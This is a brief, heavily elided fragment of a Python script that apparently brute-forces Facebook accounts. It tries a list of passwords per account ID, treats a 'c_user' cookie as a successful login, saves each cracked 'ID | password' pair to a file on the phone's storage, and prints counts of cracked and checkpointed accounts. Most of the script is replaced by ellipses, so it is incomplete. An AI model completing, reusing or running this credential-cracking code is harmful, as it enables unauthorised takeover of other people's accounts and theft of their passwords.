    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/raja-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[RAJA] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
